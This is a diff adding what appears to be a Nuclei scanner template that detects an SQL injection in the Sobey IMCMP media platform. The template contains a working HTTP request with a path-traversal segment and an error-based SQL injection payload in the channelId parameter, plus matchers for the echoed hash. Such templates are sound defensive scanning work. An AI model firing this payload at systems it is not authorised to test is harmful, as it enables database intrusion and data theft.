@@ -1,0 +1,32 @@
+id: sobey-imcmp-querymultiarglistcreatenname-sqli
+
+info:
+  name: Sobey IMCMP queryMultiArgListCreateNname SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Sobey Integrated Media Content Management Platform (IMCMP) is vulnerable to an SQL injection in the queryMultiArgListCreateNname endpoint. Exploiting this vulnerability can lead to sensitive data exposure or database control.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/mch/statistics/js/../queryMultiArgListCreateNname?channelId=1+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+%28ELT%286628%3D6628%2Cmd5({{t1}})%29%29%29%2C0x7e%29%2C6628%29&token=1&siteCode=1&parameter=auditor HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Sobey"
+          - "queryMultiArgListCreateNname"
+          - "java.sql.SQLException"
+          - "~{{t2}}~"
+        part: body
